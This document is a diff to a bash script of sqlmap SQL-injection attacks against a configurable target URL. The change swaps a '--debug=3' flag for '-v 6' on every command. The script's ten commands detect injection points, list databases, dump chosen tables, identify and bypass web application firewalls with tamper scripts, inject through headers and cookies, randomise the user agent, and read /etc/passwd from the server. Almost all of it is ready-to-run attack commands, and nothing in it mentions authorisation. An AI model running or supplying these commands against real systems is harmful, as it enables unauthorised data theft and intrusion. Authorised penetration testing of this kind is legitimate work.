@@ -20,35 +20,35 @@ log_command() {
 }
 
 # 1. Basic SQL Injection Test
-log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --debug=3"
+log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 -v 6"
 
 # 2. Enumerate the Databases
-log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --dbs --debug=3"
+log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --dbs -v 6"
 
 # 3. Dump Data from a Specific Table
 DATABASE_NAME="your_database_name" # Replace with the actual database name
 TABLE_NAME="your_table_name"         # Replace with the actual table name
-log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 -D '$DATABASE_NAME' -T '$TABLE_NAME' --dump --debug=3"
+log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 -D '$DATABASE_NAME' -T '$TABLE_NAME' --dump -v 6"
 
 # 4. Identify Injection Points
-log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=5 --risk=3 --identify-waf --debug=3"
+log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=5 --risk=3 --identify-waf -v 6"
 
 # 5. Use Tamper Scripts to Bypass WAF
-log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --tamper='$TAMPER_SCRIPTS' --debug=3"
+log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --tamper='$TAMPER_SCRIPTS' -v 6"
 
 # 6. Test for Injection via HTTP Headers
-log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --headers='X-Forwarded-For: 127.0.0.1' --debug=3"
+log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --headers='X-Forwarded-For: 127.0.0.1' -v 6"
 
 # 7. Use Cookies for Injection Testing
-log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --cookie='session=abc123' --debug=3"
+log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --cookie='session=abc123' -v 6"
 
 # 8. Use Different HTTP Methods
-log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --method=POST --debug=3"
+log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --method=POST -v 6"
 
 # 9. Randomize User-Agent and Referer
-log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --random-agent --debug=3"
+log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --random-agent -v 6"
 
 # 10. Check for SQL Injection via Files and Payloads
-log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --file-read=/etc/passwd --debug=3"
+log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --file-read=/etc/passwd -v 6"
 
 echo "[*] All tests completed. Results are saved in $LOGFILE."
